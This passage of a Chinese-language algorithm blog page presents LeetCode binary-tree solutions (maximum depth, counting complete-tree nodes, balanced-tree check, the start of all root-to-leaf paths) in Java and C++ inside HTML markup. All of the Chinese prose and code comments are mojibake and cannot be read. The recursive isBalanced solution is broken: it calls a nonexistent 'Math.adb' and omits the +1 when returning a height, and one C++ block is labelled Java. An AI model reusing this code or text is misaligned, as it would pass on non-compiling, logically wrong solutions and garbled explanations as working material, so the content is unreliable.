class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> maxDepth(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightDepth</span> <span class="operator">=</span> maxDepth(root.right);</span><br><span class="line">        <span class="keyword">return</span> Math.max(leftDepth ,rightDepth)+<span class="number">1</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxnum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        ans(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> maxnum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">ans</span><span class="params">(TreeNode tr, <span class="type">int</span> tmp)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(tr == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        tmp++;</span><br><span class="line">        maxnum = maxnum &lt; tmp ? tmp : maxnum;</span><br><span class="line">        ans(tr.left, tmp);</span><br><span class="line">        ans(tr.right, tmp);</span><br><span class="line">        tmp--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="222-å®Œå…¨äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°"><a href="#222-å®Œå…¨äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°" class="headerlink" title="222.å®Œå…¨äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°"></a>222.å®Œå…¨äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°</h2><p>ç»™ä½ ä¸€æ£µ å®Œå…¨äºŒå‰æ ‘ çš„æ ¹èŠ‚ç‚¹ root ï¼Œæ±‚å‡ºè¯¥æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°ã€‚<br>å®Œå…¨äºŒå‰æ ‘ çš„å®šä¹‰å¦‚ä¸‹ï¼šåœ¨å®Œå…¨äºŒå‰æ ‘ä¸­ï¼Œé™¤äº†æœ€åº•å±‚èŠ‚ç‚¹å¯èƒ½æ²¡å¡«æ»¡å¤–ï¼Œå…¶ä½™æ¯å±‚èŠ‚ç‚¹æ•°éƒ½è¾¾åˆ°æœ€å¤§å€¼ï¼Œå¹¶ä¸”æœ€ä¸‹é¢ä¸€å±‚çš„èŠ‚ç‚¹éƒ½é›†ä¸­åœ¨è¯¥å±‚æœ€å·¦è¾¹çš„è‹¥å¹²ä½ç½®ã€‚è‹¥æœ€åº•å±‚ä¸ºç¬¬ h å±‚ï¼Œåˆ™è¯¥å±‚åŒ…å« 1~ 2h ä¸ªèŠ‚ç‚¹ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-16.png"></p><p>åœ¨å®Œå…¨äºŒå‰æ ‘ä¸­ï¼Œé™¤äº†æœ€åº•å±‚èŠ‚ç‚¹å¯èƒ½æ²¡å¡«æ»¡å¤–ï¼Œå…¶ä½™æ¯å±‚èŠ‚ç‚¹æ•°éƒ½è¾¾åˆ°æœ€å¤§å€¼ï¼Œå¹¶ä¸”æœ€ä¸‹é¢ä¸€å±‚çš„èŠ‚ç‚¹éƒ½é›†ä¸­åœ¨è¯¥å±‚æœ€å·¦è¾¹çš„è‹¥å¹²ä½ç½®ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-17.png"></p><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><h4 id="é€’å½’è§£æ³•"><a href="#é€’å½’è§£æ³•" class="headerlink" title="é€’å½’è§£æ³•"></a>é€’å½’è§£æ³•</h4><ol><li>ç¡®å®šé€’å½’å‡½æ•°çš„å‚æ•°å’Œè¿”å›å€¼ï¼šå‚æ•°å°±æ˜¯ä¼ å…¥æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œè¿”å›å°±è¿”å›ä»¥è¯¥èŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹äºŒå‰æ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œæ‰€ä»¥è¿”å›å€¼ä¸ºintç±»å‹ã€‚</li><li>ç¡®å®šç»ˆæ­¢æ¡ä»¶ï¼šå¦‚æœä¸ºç©ºèŠ‚ç‚¹çš„è¯ï¼Œå°±è¿”å›0ï¼Œè¡¨ç¤ºèŠ‚ç‚¹æ•°ä¸º0ã€‚</li><li>ç¡®å®šå•å±‚é€’å½’çš„é€»è¾‘ï¼šå…ˆæ±‚å®ƒçš„å·¦å­æ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œå†æ±‚å³å­æ ‘çš„èŠ‚ç‚¹æ•°é‡ï¼Œæœ€åå–æ€»å’Œå†åŠ ä¸€ ï¼ˆåŠ 1æ˜¯å› ä¸ºç®—ä¸Šå½“å‰ä¸­é—´èŠ‚ç‚¹ï¼‰å°±æ˜¯ç›®å‰èŠ‚ç‚¹ä¸ºæ ¹èŠ‚ç‚¹çš„èŠ‚ç‚¹æ•°é‡ã€‚<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getNodesNum</span><span class="params">(TreeNode* cur)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (cur == NULL) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftNum</span> <span class="operator">=</span> getNodesNum(cur-&gt;left);      <span class="comment">// å·¦</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">rightNum</span> <span class="operator">=</span> getNodesNum(cur-&gt;right);    <span class="comment">// å³</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">treeNum</span> <span class="operator">=</span> leftNum + rightNum + <span class="number">1</span>;      <span class="comment">// ä¸­</span></span><br><span class="line">        <span class="keyword">return</span> treeNum;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode* root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getNodesNum(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode* root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == NULL) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + countNodes(root-&gt;left) + countNodes(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h4 id="è¿­ä»£è§£æ³•"><a href="#è¿­ä»£è§£æ³•" class="headerlink" title="è¿­ä»£è§£æ³•"></a>è¿­ä»£è§£æ³•</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countNodes</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; que;</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">NULL</span>) que.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!que.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> size = que.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">                TreeNode* node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                result++;   <span class="comment">// è®°å½•èŠ‚ç‚¹æ•°é‡</span></span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="å®Œå…¨äºŒå‰æ ‘æ€è·¯è§£é¢˜"><a href="#å®Œå…¨äºŒå‰æ ‘æ€è·¯è§£é¢˜" class="headerlink" title="å®Œå…¨äºŒå‰æ ‘æ€è·¯è§£é¢˜"></a>å®Œå…¨äºŒå‰æ ‘æ€è·¯è§£é¢˜</h4><p>å®Œå…¨äºŒå‰æ ‘åªæœ‰ä¸¤ç§æƒ…å†µï¼Œæƒ…å†µä¸€ï¼šå°±æ˜¯æ»¡äºŒå‰æ ‘ï¼Œæƒ…å†µäºŒï¼šæœ€åä¸€å±‚å¶å­èŠ‚ç‚¹æ²¡æœ‰æ»¡ã€‚</p><p>å¯¹äºæƒ…å†µä¸€ï¼Œå¯ä»¥ç›´æ¥ç”¨ 2^æ ‘æ·±åº¦ - 1 æ¥è®¡ç®—ï¼Œæ³¨æ„è¿™é‡Œæ ¹èŠ‚ç‚¹æ·±åº¦ä¸º1ã€‚<br>å¯¹äºæƒ…å†µäºŒï¼Œåˆ†åˆ«é€’å½’å·¦å­©å­ï¼Œå’Œå³å­©å­ï¼Œé€’å½’åˆ°æŸä¸€æ·±åº¦ä¸€å®šä¼šæœ‰å·¦å­©å­æˆ–è€…å³å­©å­ä¸ºæ»¡äºŒå‰æ ‘ï¼Œç„¶åä¾ç„¶å¯ä»¥æŒ‰ç…§æƒ…å†µ1æ¥è®¡ç®—ã€‚</p><p><img src="/2024/10/29/algorithm/binarytree/image-18.png"><br><img src="/2024/10/29/algorithm/binarytree/image-19.png"></p><p>å¯ä»¥çœ‹å‡ºå¦‚æœæ•´ä¸ªæ ‘ä¸æ˜¯æ»¡äºŒå‰æ ‘ï¼Œå°±é€’å½’å…¶å·¦å³å­©å­ï¼Œç›´åˆ°é‡åˆ°æ»¡äºŒå‰æ ‘ä¸ºæ­¢ï¼Œç”¨å…¬å¼è®¡ç®—è¿™ä¸ªå­æ ‘ï¼ˆæ»¡äºŒå‰æ ‘ï¼‰çš„èŠ‚ç‚¹æ•°é‡ã€‚<br>åœ¨å®Œå…¨äºŒå‰æ ‘ä¸­ï¼Œå¦‚æœé€’å½’å‘å·¦éå†çš„æ·±åº¦ç­‰äºé€’å½’å‘å³éå†çš„æ·±åº¦ï¼Œé‚£è¯´æ˜å°±æ˜¯æ»¡äºŒå‰æ ‘ã€‚</p><p><img src="/2024/10/29/algorithm/binarytree/image-20.png"><br><img src="/2024/10/29/algorithm/binarytree/image-21.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">countNodes</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> root.left;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> root.right;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftDepth</span> <span class="operator">=</span> <span class="number">0</span>, rightDepth = <span class="number">0</span>; <span class="comment">// åˆå§‹ä¸º0ä¸ºäº†ä¸‹é¢è®¡ç®—æŒ‡æ•°æ–¹ä¾¿</span></span><br><span class="line">        <span class="keyword">while</span>(left != <span class="literal">null</span>)&#123;</span><br><span class="line">            left = left.left;</span><br><span class="line">            leftDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(right != <span class="literal">null</span>)&#123;</span><br><span class="line">            right = right.right;</span><br><span class="line">            rightDepth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(leftDepth == rightDepth)&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">2</span> &lt;&lt; leftDepth) - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> countNodes(root.left) + countNodes(root.right) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="110-å¹³è¡¡äºŒå‰æ ‘"><a href="#110-å¹³è¡¡äºŒå‰æ ‘" class="headerlink" title="110.å¹³è¡¡äºŒå‰æ ‘"></a>110.å¹³è¡¡äºŒå‰æ ‘</h2><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œåˆ¤æ–­å®ƒæ˜¯å¦æ˜¯é«˜åº¦å¹³è¡¡çš„äºŒå‰æ ‘ã€‚<br>æœ¬é¢˜ä¸­ï¼Œä¸€æ£µé«˜åº¦å¹³è¡¡äºŒå‰æ ‘å®šä¹‰ä¸ºï¼šä¸€ä¸ªäºŒå‰æ ‘æ¯ä¸ªèŠ‚ç‚¹ çš„å·¦å³ä¸¤ä¸ªå­æ ‘çš„é«˜åº¦å·®çš„ç»å¯¹å€¼ä¸è¶…è¿‡1ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-22.png"><br>ä¸‹é¢çš„ä¸æ˜¯äº†<br><img src="/2024/10/29/algorithm/binarytree/image-23.png"></p><p>äºŒå‰æ ‘èŠ‚ç‚¹çš„æ·±åº¦ï¼šæŒ‡ä»æ ¹èŠ‚ç‚¹åˆ°è¯¥èŠ‚ç‚¹çš„æœ€é•¿ç®€å•è·¯å¾„è¾¹çš„æ¡æ•°ã€‚<br>äºŒå‰æ ‘èŠ‚ç‚¹çš„é«˜åº¦ï¼šæŒ‡ä»è¯¥èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹çš„æœ€é•¿ç®€å•è·¯å¾„è¾¹çš„æ¡æ•°ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-24.png"></p><p>ä¸‹é¢ä¸»è¦è®²è§£ä¸‹ç”¨å±‚åºéå†æ¥æ±‚é«˜åº¦çš„æ€è·¯ï¼š<br>å‡è®¾æœ‰ä¸€æ£µäºŒå‰æ ‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> / \</span><br><span class="line">4   5</span><br></pre></td></tr></table></figure><ul><li><strong>æœ€å¤§æ·±åº¦</strong>æ˜¯ <code>3</code>ï¼Œå› ä¸ºä»æ ¹èŠ‚ç‚¹ <code>1</code> åˆ°å¶å­èŠ‚ç‚¹ <code>4</code> æˆ– <code>5</code> çš„è·¯å¾„é•¿åº¦æ˜¯ <code>3</code>ã€‚</li><li><strong>é«˜åº¦</strong>åœ¨å¶å­èŠ‚ç‚¹ <code>4</code> å’Œ <code>5</code> ä¸º <code>0</code>ï¼ŒèŠ‚ç‚¹ <code>2</code> çš„é«˜åº¦ä¸º <code>1</code>ï¼Œæ ¹èŠ‚ç‚¹ <code>1</code> çš„é«˜åº¦ä¸º <code>2</code>ã€‚</li></ul><p>å±‚åºéå†é€‚åˆæ±‚<strong>æœ€å¤§æ·±åº¦</strong>ã€‚æ¯éå†ä¸€å±‚ï¼Œæ·±åº¦åŠ ä¸€ã€‚å¯¹äºä¸Šé¢è¿™æ£µæ ‘ï¼Œå±‚åºéå†æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li><strong>ç¬¬ä¸€å±‚</strong>ï¼šæ ¹èŠ‚ç‚¹ <code>1</code>ï¼Œæ·±åº¦ä¸º <code>1</code>ã€‚</li><li><strong>ç¬¬äºŒå±‚</strong>ï¼šèŠ‚ç‚¹ <code>2</code> å’Œ <code>3</code>ï¼Œæ·±åº¦ä¸º <code>2</code>ã€‚</li><li><strong>ç¬¬ä¸‰å±‚</strong>ï¼šèŠ‚ç‚¹ <code>4</code> å’Œ <code>5</code>ï¼Œæ·±åº¦ä¸º <code>3</code>ã€‚</li></ol><p>å±‚åºéå†åˆ°å¶å­èŠ‚ç‚¹æ—¶ï¼Œæœ€å¤§æ·±åº¦ä¸º <code>3</code>ã€‚</p><p>ååºéå†æ±‚é«˜åº¦ï¼Œæˆ‘ä»¬éœ€è¦ä»å¶å­èŠ‚ç‚¹å¼€å§‹é€å±‚å‘ä¸Šè®¡ç®—ã€‚å¯ä»¥ä½¿ç”¨æ ˆæ¥æ¨¡æ‹Ÿååºéå†ï¼Œé€šè¿‡é€’å½’çš„æ–¹å¼æ¥æ±‚æ¯ä¸ªèŠ‚ç‚¹çš„é«˜åº¦ï¼š</p><ol><li><strong>è®¿é—®å¶å­èŠ‚ç‚¹</strong> <code>4</code> å’Œ <code>5</code>ï¼Œé«˜åº¦ä¸º <code>0</code>ã€‚</li><li><strong>å›æº¯åˆ°èŠ‚ç‚¹</strong> <code>2</code>ï¼š<code>2</code> çš„é«˜åº¦æ˜¯ <code>max(4 çš„é«˜åº¦, 5 çš„é«˜åº¦) + 1 = 1</code>ã€‚</li><li><strong>è®¿é—®èŠ‚ç‚¹</strong> <code>3</code>ï¼Œé«˜åº¦ä¸º <code>0</code>ã€‚</li><li><strong>å›æº¯åˆ°æ ¹èŠ‚ç‚¹</strong> <code>1</code>ï¼š<code>1</code> çš„é«˜åº¦æ˜¯ <code>max(2 çš„é«˜åº¦, 3 çš„é«˜åº¦) + 1 = 2</code>ã€‚</li></ol><p>æœ€ç»ˆï¼Œæ ¹èŠ‚ç‚¹çš„é«˜åº¦ä¸º <code>2</code>ï¼Œè¿™ä¹Ÿæ˜¯æ•´ä¸ªæ ‘çš„é«˜åº¦ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// é€’å½’æ³•</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> getHeight(root) != -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftHeight</span> <span class="operator">=</span> getHeight(root.left);</span><br><span class="line">        <span class="keyword">if</span>(leftHeight == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rightHeight</span> <span class="operator">=</span> getHeight(root.right);</span><br><span class="line">        <span class="keyword">if</span>(rightHeight == -<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å·¦å³å­æ ‘é«˜åº¦å·®å¤§äº1å°±ä¸æ˜¯å¹³è¡¡æ ‘äº†</span></span><br><span class="line">        <span class="keyword">if</span>(Math.adb(leftHeight, - rightHeight) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Math.max(leftHeight, rightHeight);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¿­ä»£æ³•ï¼Œæ•ˆç‡è¾ƒä½ï¼Œè®¡ç®—é«˜åº¦æ—¶ä¼šé‡å¤éå†</span></span><br><span class="line"><span class="comment">     * æ—¶é—´å¤æ‚åº¦ï¼šO(n^2)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isBalanced</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(root != <span class="literal">null</span> || !stack.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(root != <span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(root);</span><br><span class="line">                root = root.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">inNode</span> <span class="operator">=</span> stack.peek();</span><br><span class="line">            <span class="comment">// å³èŠ‚ç‚¹ä¸ºnullæˆ–å·²éå†è¿‡</span></span><br><span class="line">            <span class="keyword">if</span>(inNode.right == <span class="literal">null</span> || inNode.right == pre)&#123;</span><br><span class="line">                <span class="comment">// æ¯”è¾ƒå·¦å³å­æ ‘é«˜åº¦å·®ï¼Œè¾“å‡º</span></span><br><span class="line">                <span class="keyword">if</span>(Math.abs(getHeight(inNode.left) - getHeight(inNode.right)) &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                stack.pop();</span><br><span class="line">                pre = inNode;</span><br><span class="line">                root = <span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                root = inNode.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å±‚åºéå†ï¼Œæ±‚ç»“ç‚¹çš„é«˜åº¦</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Deque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        deque.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> deque.size();</span><br><span class="line">            depth++;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i= <span class="number">0</span>; i &lt; size; i++)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">poll</span> <span class="operator">=</span> deque.poll();</span><br><span class="line">                <span class="keyword">if</span>(poll.left != <span class="literal">null</span>)&#123;</span><br><span class="line">                    deque.offer(poll.left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(poll.right != <span class="literal">null</span>)&#123;</span><br><span class="line">                    deque.offer(poll.right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="257-äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„"><a href="#257-äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„" class="headerlink" title="257. äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„"></a>257. äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„</h2><p>ç»™ä½ ä¸€ä¸ªäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ root ï¼ŒæŒ‰ ä»»æ„é¡ºåº ï¼Œè¿”å›æ‰€æœ‰ä»æ ¹èŠ‚ç‚¹åˆ°å¶å­èŠ‚ç‚¹çš„è·¯å¾„ã€‚</p><p>è¿™é“é¢˜ç›®è¦æ±‚ä»æ ¹èŠ‚ç‚¹åˆ°å¶å­çš„è·¯å¾„ï¼Œæ‰€ä»¥éœ€è¦å‰åºéå†ï¼Œè¿™æ ·æ‰æ–¹ä¾¿è®©çˆ¶èŠ‚ç‚¹æŒ‡å‘å­©å­èŠ‚ç‚¹ï¼Œæ‰¾åˆ°å¯¹åº”çš„è·¯å¾„ã€‚<br><img src="/2024/10/29/algorithm/binarytree/image-25.png"></p><figure class="highlight java"><table><tr><td 